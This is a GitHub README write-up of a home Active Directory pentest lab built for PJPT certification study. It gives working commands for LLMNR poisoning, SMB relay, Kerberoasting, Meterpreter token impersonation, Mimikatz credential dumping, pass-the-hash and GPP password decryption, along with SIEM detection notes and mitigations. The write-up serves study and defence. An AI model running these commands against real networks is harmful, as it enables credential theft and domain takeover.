# 🛡️ Active Directory Attack & Defense Lab

> A full-scope Active Directory penetration testing lab built during preparation for the **PJPT (Practical Junior Penetration Tester)** certification. Covers core AD attack techniques from initial access through domain compromise, with detection engineering notes for blue teamers.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Lab Environment](#lab-environment)
- [Attack Walkthrough](#attack-walkthrough)
  - [1. LLMNR Poisoning](#1-llmnr-poisoning)
  - [2. SMB Relay](#2-smb-relay)
  - [3. Kerberoasting](#3-kerberoasting)
  - [4. Token Impersonation](#4-token-impersonation)
  - [5. Credential Dumping (Mimikatz)](#5-credential-dumping-mimikatz)
  - [6. Pass-the-Hash & Pass-the-Password](#6-pass-the-hash--pass-the-password)
  - [7. GPP Attack](#7-gpp-group-policy-preferences-attack)
- [Full Attack Chain Summary](#full-attack-chain-summary)
- [Detection Engineering](#detection-engineering-siem)
- [Disclaimer](#disclaimer)
- [Author](#author)

---

## Overview

This lab demonstrates a complete Active Directory attack lifecycle, simulating a realistic internal network compromise. Techniques covered include:

| Phase | Technique |
|-------|-----------|
| Initial Access | LLMNR Poisoning |
| Credential Capture | Responder (NTLM Hash Capture) |
| Lateral Movement | SMB Relay |
| Privilege Escalation | Kerberoasting, Token Impersonation |
| Credential Dumping | Mimikatz |
| Persistence | Pass-the-Hash / Pass-the-Password |
| Domain Compromise | GPP Attack |

---

## Lab Environment

> *(Add your lab setup here — e.g., VMs used, network topology, OS versions, tools installed)*

- **Attacker Machine:** Kali Linux
- **Domain Controller:** Windows Server 20XX — `MARVEL.local`
- **Victim Machines:** Windows 10/11 endpoints
- **Tools:** Responder, Impacket, CrackMapExec, Metasploit, Mimikatz

---

## Attack Walkthrough

### 1. LLMNR Poisoning

**What it is:** Link-Local Multicast Name Resolution (LLMNR) is a fallback name resolution protocol. When DNS fails, Windows broadcasts LLMNR queries on the local network — an attacker can respond and capture NTLMv2 hashes.

**Screenshots:**

![LLMNR Step 1](docs/screenshots/LLMNR-01.png)
![LLMNR Step 2](docs/screenshots/LLMNR-02.png)

**Key Outcomes:**
- Captured NTLMv2 hashes using [Responder](https://github.com/lgandx/Responder)
- Exploited weak/unconfigured name resolution fallback

```bash
sudo responder -I tun0 -dwP
```

---

### 2. SMB Relay

**What it is:** Instead of cracking captured NTLM hashes, relay them directly to a target machine for authentication — provided SMB Signing is disabled.

**Screenshots:**

![SMB Relay Step 1](docs/screenshots/smbrelay-01.png)
![SMB Relay Step 2](docs/screenshots/smbrelay-02.png)

**Step 1 — Check for SMB Signing:**

```bash
nmap --script smb2-security-mode -p 445 <target_range>
```

> ✅ **SMB Signing NOT required → Target is vulnerable**

**Step 2 — Run Responder & NTLM Relay:**

```bash
# Disable SMB and HTTP in Responder config first
sudo responder -I tun0 -dwP

# Relay captured hashes to targets
ntlmrelayx.py -tf targets.txt -smb2support
```

---

### 3. Kerberoasting

**What it is:** Any authenticated domain user can request a Kerberos TGS ticket for any service account (SPN). The ticket is encrypted with the service account's password hash — making it crackable offline.

**Screenshots:**

![Kerberoasting](docs/screenshots/Kerberoasting.png)
![Krbtgt Hash](docs/screenshots/Krbtgt.png)

**Request Service Tickets:**

```bash
GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.138.1 -request
```

**Crack Offline:**

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Key Outcomes:**
- Extracted service account hashes
- Offline password cracking → privilege escalation path

---

### 4. Token Impersonation

**What it is:** After gaining a foothold, Windows access tokens of logged-in users can be impersonated via Metasploit's `incognito` module — allowing privilege escalation without cracking any passwords.

**Screenshot:**

![Token Impersonation](docs/screenshots/token_imp.png)

**Meterpreter Commands:**

```bash
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "MARVEL\\fcastle"
```

> ✅ **Successfully impersonated domain user**

---

### 5. Credential Dumping (Mimikatz)

**What it is:** Once admin/SYSTEM access is achieved, Mimikatz can extract plaintext credentials, NTLM hashes, and Kerberos tickets from LSASS memory.

**Screenshot:**

![Mimikatz](docs/screenshots/mimikatz.png)

**Commands:**

```powershell
Invoke-Mimikatz -Command "privilege::debug"
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```

> ⚠️ Requires `SeDebugPrivilege` — only available to local admins.

---

### 6. Pass-the-Hash & Pass-the-Password

**What it is:** Use captured credentials (plaintext passwords or NTLM hashes) to authenticate across the network without needing to crack them.

**Screenshots:**

![Pass-the-Password](docs/screenshots/ptp-01.png)
![Pass-the-Hash](docs/screenshots/ptp-02.png)

**Pass-the-Password:**

```bash
crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
```

**Pass-the-Hash:**

```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --local-auth
```

**Key Outcomes:**
- Lateral movement across multiple machines
- Identify hosts where credentials are reused

---

### 7. GPP (Group Policy Preferences) Attack

**What it is:** Older Windows environments stored credentials in Group Policy Preference XML files (`Groups.xml`). Microsoft published the AES encryption key, making these passwords trivially reversible.

**Screenshot:**

![GPP Attack](docs/screenshots/PTH.png)

**Decrypt the `cpassword` field:**

```bash
gpp-decrypt <cpassword_value>
```

**Key Outcomes:**
- Recovered plaintext admin credentials stored in SYSVOL
- Demonstrates the risk of legacy GPP configurations

> 💡 **Mitigation:** Install [MS14-025](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-424121e8-0ddb-accc-38bb-24285b9b7de2) patch and audit SYSVOL for `cpassword` entries.

---

## Full Attack Chain Summary

```
[Initial Access]        LLMNR Poisoning  →  NTLMv2 Hash Captured (Responder)
        ↓
[Lateral Movement]      SMB Relay        →  Authenticated as User on Target
        ↓
[Privilege Escalation]  Kerberoasting    →  Service Account Hash → Cracked
        ↓
[Token Abuse]           Impersonation    →  Domain User Access via Token
        ↓
[Credential Dumping]    Mimikatz         →  Plaintext Creds + All Hashes
        ↓
[Persistence]           Pass-the-Hash    →  Move Laterally with Hash
        ↓
[Domain Compromise]     GPP Attack       →  Admin Creds from SYSVOL
```

---

## Detection Engineering (SIEM)

Blue team detection use cases for each technique:

| Attack | Detection Signal |
|--------|-----------------|
| LLMNR Poisoning | LLMNR/NBT-NS traffic from unexpected hosts; Event ID 4648 |
| SMB Relay | Multiple failed SMB authentications; inbound SMB from non-DC hosts |
| Kerberoasting | Large volume of TGS requests from a single user; Event ID 4769 |
| Token Impersonation | Privilege use events; Event ID 4672, 4624 Logon Type 9 |
| Mimikatz / LSASS Dump | LSASS access by non-system processes; Event ID 4656, Sysmon Event 10 |
| Pass-the-Hash | NTLM authentication anomalies; Event ID 4776 with suspicious source |
| GPP Attack | Access to SYSVOL `Groups.xml`; file read events on policy files |

**Recommended Tools:** Splunk, Elastic SIEM, Microsoft Sentinel, Velociraptor

---

## Disclaimer

This lab was built in a **controlled, isolated home lab environment** for educational purposes only. All techniques demonstrated are intended for authorized penetration testing and security research. Do not use these techniques against systems you do not own or have explicit written permission to test.

**This writeup was developed during preparation for the [PJPT (Practical Junior Penetration Tester)](https://certifications.tcm-sec.com/pjpt/) certification** by TCM Security. It covers the majority of key Active Directory attack techniques assessed in the exam.

> 📝 A separate blog post detailing the 30-day study strategy will be published soon.

---

## Author

**Shubhom Rawat**

*PenTest+ | eJPT | PJPT | CCSK | Cybersecurity @ Penn State*


---

> ⭐ If this lab write-up helped you, consider giving the repo a star!